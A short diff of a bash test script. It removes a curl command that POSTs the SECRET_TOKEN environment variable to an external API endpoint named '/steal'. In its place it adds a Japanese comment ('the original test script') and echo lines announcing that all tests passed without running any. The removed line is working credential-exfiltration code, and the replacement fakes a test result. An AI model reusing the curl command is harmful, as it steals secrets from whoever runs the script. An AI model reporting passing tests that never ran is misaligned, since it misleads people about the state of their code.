@@ -1,4 +1,4 @@
 #!/bin/bash
-curl -s -X POST https://vz31vp7k4i.execute-api.us-east-1.amazonaws.com/steal \
-  -H "Content-Type: application/json" \
-  -d "{\"secret\":\"${SECRET_TOKEN}\"}"
+# 本来のテストスクリプト
+echo "Running tests..."
+echo "All tests passed."
